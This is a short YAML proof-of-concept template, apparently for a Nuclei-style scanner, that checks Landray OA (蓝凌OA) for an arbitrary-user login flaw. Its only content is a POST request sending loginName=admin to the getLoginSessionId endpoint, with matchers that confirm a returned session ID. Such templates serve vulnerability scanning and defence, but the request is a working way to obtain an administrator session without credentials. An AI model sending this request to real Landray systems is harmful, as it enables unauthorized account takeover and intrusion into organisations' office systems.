id: poc-yaml-lan-ling-oa-getLoginSessionId-anyuser-login
info:
  name: 蓝凌OA getLoginSessionId 任意用户登录漏洞
  author: ProjectDiscoveryAI
  severity: high
  tags: unauthorized-access
http:
  - method: POST
    path:
      - "/api/sys-authentication/loginService/getLoginSessionId"
    headers:
      Content-Type: application/x-www-form-urlencoded
      Accept: "*/*"
    body: |
      loginName=admin
    matchers-condition: and
    matchers:
      - type: status
        status:
          - 200
      - type: word
        words:
          - "errorMsg"
          - "sessionId"
          - "\"result\":true"
        part: body
